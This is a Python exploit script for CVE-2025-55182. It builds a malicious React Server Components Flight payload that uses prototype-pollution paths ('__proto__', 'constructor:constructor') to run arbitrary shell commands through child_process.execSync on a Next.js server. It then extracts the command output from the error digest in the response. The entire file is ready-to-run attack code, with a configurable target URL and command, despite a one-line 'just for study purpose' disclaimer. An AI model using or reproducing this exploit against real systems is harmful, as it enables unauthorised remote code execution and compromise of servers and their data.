# Remote Code Execution script to exploit CVE-2025-55182
# reference: https://github.com/msanft/CVE-2025-55182
# This is just for study purpose.
import re
import sys
import json
import requests


def build_payload(executable):
    """Build the malicious Flight payload that runs `executable` on the server."""
    prefix = (
        f"var res = process.mainModule.require('child_process')"
        f".execSync('{executable} 2>&1 || true',{{'timeout':10000}}).toString().trim(); "
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
    )
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": prefix,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }


def exploit(base_url, executable):
    """Send the exploit request and return the response."""
    files = {
        "0": (None, json.dumps(build_payload(executable))),
        "1": (None, '"$@0"'),
    }
    headers = {"Next-Action": "x"}
    return requests.post(base_url, files=files, headers=headers, timeout=10)


def parse_output(response_text):
    """Extract the command output from the server's error line.

    The command runs with `2>&1 || true`, so stdout+stderr always come back in
    the "digest" field regardless of the command's exit code. The value can span
    multiple lines when the command output itself contains newlines, so parse the
    whole response rather than working line by line.
    """
    m = re.search(r'\{[^{}]*"digest"\s*:.*\}', response_text, re.DOTALL)
    if not m:
        return ""
    # The greedy match may swallow trailing Flight rows; trim back to a
    # parseable object.
    blob = m.group(0)
    while blob:
        try:
            return json.loads(blob).get("digest", "")
        except json.JSONDecodeError:
            cut = blob.rfind("}")
            if cut <= 0:
                break
            blob = blob[:cut]
    return ""


def main():
    base_url = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    executable = sys.argv[2] if len(sys.argv) > 2 else "id"

    res = exploit(base_url, executable)
    print(f"status code: {res.status_code}")
    print(f"response text:\n{res.text}")
    print(f"executable response:\n{parse_output(res.text)}")


if __name__ == "__main__":
    main()
